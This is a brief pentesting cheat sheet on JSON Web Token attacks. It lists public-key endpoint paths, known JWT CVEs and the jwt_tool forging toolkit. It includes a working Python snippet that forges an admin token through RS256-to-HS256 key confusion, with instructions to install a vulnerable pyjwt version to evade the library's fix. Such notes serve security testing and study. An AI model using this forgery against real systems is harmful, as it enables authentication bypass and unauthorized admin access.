JSON Web Token
==============

## Finding Public Keys
Some common locations for public keys are:
```
/api/keys
/api/v1/keys
/.well-known/jwks.json
/openid/connect/jwks.json
/jwks.json
```

## Vulnerabilities
There is know vulnerabilities on JWT:

- [CVE-2015-2951](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2951): The alg=none signature-bypass vulnerability in `JWT.php`
- [CVE-2016-10555](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10555): The RS/HS256 public key mismatch vulnerability because the server does not enforce "algorithm"
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114): It's possible to re-sign a token using a key that is embedded within the token


## JWT Toolkit
```bash
jwt_tool.py is a toolkit for validating, forging and cracking JWTs (JSON Web Tokens).
```

[https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)


## Exploit in Python

On some vulnerable implementation, it's possible to replace the JWT algorithm
from `RS256` to `HS256`. The vulnerable library use the public key as a secret.

```python
import jwt
key = open('public_key.pem', 'r').read()
jwt.encode({"username":"admin"}, key=key, algorithm='HS256')
```

You need to install the `pyjwt` package in a specific version. In the last
versions, the library check the key is a x509 certificate:

```bash
  File ".../lib/python3.6/site-packages/jwt/algorithms.py", line 151, in prepare_key
    'The specified key is an asymmetric key or x509 certificate and'
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.
```

The version `0.4.3` has not this check:

```bash
pip install pyjwt==0.4.3
```
